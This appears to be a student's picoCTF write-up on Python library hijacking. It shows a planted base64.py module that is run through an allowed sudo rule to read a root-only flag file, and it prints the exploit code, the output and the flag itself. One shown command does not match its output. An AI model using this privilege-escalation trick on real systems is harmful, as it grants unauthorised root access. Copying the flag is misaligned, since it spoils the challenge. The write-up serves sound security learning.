# Writeup: Hijacking

## Introduction

We will be taking advantage of the hijacking vulnerability. This vulnerability allows us to take advantage of the way programming languages or programs look for certain files which allow us to inject our own code into the binary. This challenge description states that there is a python file we can use to find the flag. My first instinct is to list the contents of the directory which comes up blank then I list all hidden files using the command:
`ls -la`
Which lists the .server.py file that I assume the challenge creator intended for us to use to get the flag. Next I used the cat command to see the contents of the python file and was able to see that there were no direct inputs or obvious exploits in the source code itself. The source code is listed below:

```
    import base64
    import os
    import socket
    ip = 'picoctf.org'
    response = os.system("ping -c 1 " + ip)
    #saving ping details to a variable
    host_info = socket.gethostbyaddr(ip)
    #getting IP from a domaine
    host_info_to_str = str(host_info[2])
    host_info = base64.b64encode(host_info_to_str.encode('ascii'))
    print("Hello, this is a part of information gathering",'Host: ', host_info)
```

## Figuring Out the Permissions

After looking through it a bit more I realized that we could create our own import files locally to replace the ones that are imported in the file because python looks for import modules locally first and then in other locations. So I wrote a script to allow me to print out the flag in root shown below called base64.py:

```
    import subprocess
    subprocess.call(['cat', '/root/flag.txt'])
```

When I ran the .server.py file again I came up on another error listed below:

```
    cat: /root/flag.txt: Permission denied
    sh: 1: ping: not found
    Traceback (most recent call last):
    File "picoctf/.server.py", line 7, in <module>
        host_info = socket.gethostbyaddr(ip)
    socket.gaierror: [Errno -5] No address associated with hostname
```

This confused me because the .server.py file had root file permissions, but when I investigated further I realized that the base64.py file was created with my own user permissons.

`ls -la`

```
    ... rest of the file directory
    -rw-rw-r-- 1 picoctf picoctf   61 Mar  8 21:02 base64.py
```

My next instinct was to run sudo -l to see what kind of permissions I had which are shown below:

`sudo -l`

```
    Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User picoctf may run the following commands on challenge:
        (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

What this means is that I have the permission to run these files using root permissions if I used them exactly as they are written. So I ran the following command:

`sudo /usr/bin/python3 /home/picoctf/.server.py`

```
    cat: /root/flag.txt: No such file or directory
    sh: 1: ping: not found
    Traceback (most recent call last):
        File "/home/picoctf/.server.py", line 7, in <module>
        host_info = socket.gethostbyaddr(ip)
    socket.gaierror: [Errno -5] No address associated with hostname
```

Since this wasn't the right file I changed the script to list the contents of the root directory:

```
        import subprocess
        subprocess.call(['ls', '-la', '/root/flag.txt']) 
```

Running the python file with this updated script gave me this:

```
    drwx------ 1 root root   23 Sep 26  2024 .
    drwxr-xr-x 1 root root   51 Mar  8 20:55 ..
    -rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
    -rw-r--r-- 1 root root   43 Sep 26  2024 .flag.txt
    -rw-r--r-- 1 root root  161 Dec  5  2019 .profile
    sh: 1: ping: not found
    Traceback (most recent call last):
    File "/home/picoctf/.server.py", line 7, in <module>
        host_info = socket.gethostbyaddr(ip)
    socket.gaierror: [Errno -5] No address associated with hostname
```

## Results

As you can see the right file for the flag is .flag.txt. With that in mind I updated the script one final time to reflect the correct filename and use the cat command and this was the result:

```
    import subprocess
    subprocess.call(['cat', '/root/.flag.txt'])
```

```
    picoCTF{pYth0nn_libraryH!j@CK!n9_4c188d27}
    sh: 1: ping: not found
    Traceback (most recent call last):
    File "/home/picoctf/.server.py", line 7, in <module>
    host_info = socket.gethostbyaddr(ip)
    socket.gaierror: [Errno -5] No address associated with hostname
```

Finally, we have the flag.
